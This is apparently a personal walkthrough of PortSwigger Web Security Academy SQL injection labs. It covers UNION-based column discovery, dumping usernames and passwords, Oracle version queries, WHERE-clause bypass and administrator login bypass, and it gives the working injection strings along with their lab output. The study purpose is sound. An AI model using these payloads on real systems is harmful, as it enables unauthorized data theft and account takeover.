# SQL Injection

## :material-gauge: UNION attack, determining the number of columns returned by the query

!!! question
    This lab contains an SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables. The first step of such an attack is to determine the number of columns that are being returned by the query. You will then use this technique in subsequent labs to construct the full attack.

    To solve the lab, determine the number of columns returned by the query by performing an SQL injection UNION attack that returns an additional row containing null values.

What we know:

- vulnerability in product category filter
- should be able to use UNION attack to see data from other tables
- first step is to see number of columns being returned by the query

https://acd21fe61eb0074fc0b23b47009700b8.web-security-academy.net/filter?category=Pets

The first approach to determining how many columns is to do the `ORDER BY` trick with increasing numbers until you get an error. We do that and see that it errors on `4`, indicating that three columns are being returned:

```
/filter?category=Pets' ORDER BY 1 --
/filter?category=Pets' ORDER BY 2 --
/filter?category=Pets' ORDER BY 3 --
/filter?category=Pets' ORDER BY 4 -- (error)
```

The second approach (and the one required for solving this lab) is to use the `UNION SELECT NULL` trick with the selected number of NULL columns. Based on the information gained in the first approach, we craft the following query/filter and solve the challenge:

```
/filter?category=Pets' UNION SELECT NULL, NULL, NULL --
```

## :material-gauge: UNION attack, finding a column containing text

!!! question
    This lab contains an SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables. To construct such an attack, you first need to determine the number of columns returned by the query. You can do this using a technique you learned in a previous lab. The next step is to identify a column that is compatible with string data.

    The lab will provide a random value that you need to make appear within the query results. To solve the lab, perform an SQL injection UNION attack that returns an additional row containing the value provided. This technique helps you determine which columns are compatible with string data.

Given:

- SQL injection vuln in the product category filter
- Should be able to do a union attack to pull data from other tables
- builds on previous lab
- need to identify a column that is compatible with string data

> Goal: perform the SQL Injection UNION attack, return additional row containing value provided: `S3HPlT`.

We walk through the three fields looking for a match:

```
/filter?category=Pets' UNION SELECT 'S3HPlT',NULL,NULL-- (internal server error)
/filter?category=Pets' UNION SELECT NULL,'S3HPlT',NULL-- (success!)
/filter?category=Pets' UNION SELECT NULL,'S3HPlT',NULL-- (internal server error)
```

And we can see that the second attempt solved the challenge - we now know that the query is returning 3 columns and the second is compatible with string data.


## :material-gauge: SQL injection UNION attack, retrieving data from other tables

!!! question
    This lab contains an SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables. To construct such an attack, you need to combine some of the techniques you learned in previous labs.

    The database contains a different table called users, with columns called username and password.

    To solve the lab, perform an SQL injection UNION attack that retrieves all usernames and passwords, and use the information to log in as the administrator user.

Building on prior solutions, we wnt to retrieve data from other tables. We are told that there is another table called `users` that has a column named `username` and another called `password`. Note that this is easier than the above as we don't have to shove things into one column (yet).

```
/filter?category=Pets' UNION select username, password from users --
```

yields us information like the following:

```
The Lazy Dog

The Lazy Dog is brought to you by the same people who invented the...

carlos

934rdmfpigx806kxma0m

administrator

734gs039pp7hvz53glwk

wiener

6yfdkdcuexrs36a2nd2a
```

We can then take this information and log in as the administrator account.


## :material-gauge: SQL injection UNION attack, retrieving multiple values in a single column

!!! question
    This lab contains an SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response so you can use a UNION attack to retrieve data from other tables.

    The database contains a different table called users, with columns called username and password.

    To solve the lab, perform an SQL injection UNION attack that retrieves all usernames and passwords, and use the information to log in as the administrator user.

This is very much like the prior scenario, but uses the structure from the prior challenges wherein you have three columns, and only the second is compatible with strings. Therefore, we have to shove both the username and password into the same field. This can be done with a query that looks like the following:


```
// determine how many columns exist
filter?category=Pets' UNION SELECT NULL,NULL --

// confirm which columns support text:
filter?category=Pets' UNION SELECT NULL,'a' -- (column 2)

// grab the username/password and stuff them into the 2nd column
/filter?category=Pets' UNION SELECT NULL,username || '~' || password from users --
```

This yeilds a result like the following:

```
More Than Just Birdsong
Pest Control Umbrella
Babbage Web Spray
administrator~o7188srj54a849wwm2cq
Giant Grasshopper
wiener~8hxtfx4depv2otj53nb9
carlos~z54oyd1moidzjxuz9oxm
```

And we can then log in as the administrator, solving the challenge


## :material-gauge: SQL injection attack, querying the database type and version on Oracle

!!! question
    This lab contains an SQL injection vulnerability in the product category filter. You can use a UNION attack to retrieve the results from an injected query.

    To solve the lab, display the database version string.

!!! tip
    I failed quite a bit on this until I clicked the 'hint' and learned that every select on ORACLE needs a from stmt. 

```
// determine how many columns are being returned (2)
/filter?category=Gifts' ORDER BY 2 --

// confirm that both columns are compatible with strings (using built-in table named `dual`)
/filter?category=Gifts' UNION SELECT 'a','a' from dual --

// now let's start doing something
/filter?category=Gifts' UNION SELECT version FROM v$version --

// query the banner
/filter?category=Gifts' UNION SELECT BANNER,'a' from v$version --
```

And that produces the solution:

```
CORE 11.2.0.2.0 Production
a
NLSRTL Version 11.2.0.2.0 - Production
a
Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production
a
PL/SQL Release 11.2.0.2.0 - Production
a
TNS for Linux: Version 11.2.0.2.0 - Production
a
```

## :material-gauge-empty: Vulnerability in WHERE clause allowing retrieval of hidden data

!!! question
    This lab contains an SQL injection vulnerability in the product category filter. When the user selects a category, the application carries out an SQL query like the following:

    `SELECT * FROM products WHERE category = 'Gifts' AND released = 1`

    To solve the lab, perform an SQL injection attack that causes the application to display details of all products in any category, both released and unreleased.

This is a simple challenge to introduce you to the idea of SQL injection. Given a site such as https://acd01f0d1f5c2eb5c0cc51a2007a0016.web-security-academy.net/ you can view differenct product categories which are controlled by the URL (e.g. `/filter?category=Pets`). A simple SQL injection attack added to the end (`/filter?category=' OR 1=1 --`) solves the challenge by telling the SQL server to return all products with no category set or where 1=1 (which always evaluates to True). Adding the `--` at the end comments out any remainder of the SQL statment in the application code.

## :material-gauge-empty: Vulnerability allowing login bypass

!!! question
    This lab contains an SQL injection vulnerability in the login function.

    To solve the lab, perform an SQL injection attack that logs in to the application as the `administrator` user.

This is another simple case wherein you are encouraged to log in at a standard username/password form (https://ac031f731e5b8017c0984a7400ba0058.web-security-academy.net/login). Much like the prior example, however, you can manipulate the query directly by providing a username of `administrator'--` and any value for the password field. This terminates the query that is presumeably something like 
`SELECT * FROM users WHERE username = 'administrator' AND password = 'myPassword'`. It results in the following query: `SELECT * FROM users WHERE username = 'administrator'--' AND password = 'no matter'`


### SQL injection attack, querying the database type and version on MySQL and Microsoft

Similar to the prior




### SQL injection attack, listing the database contents on Oracle


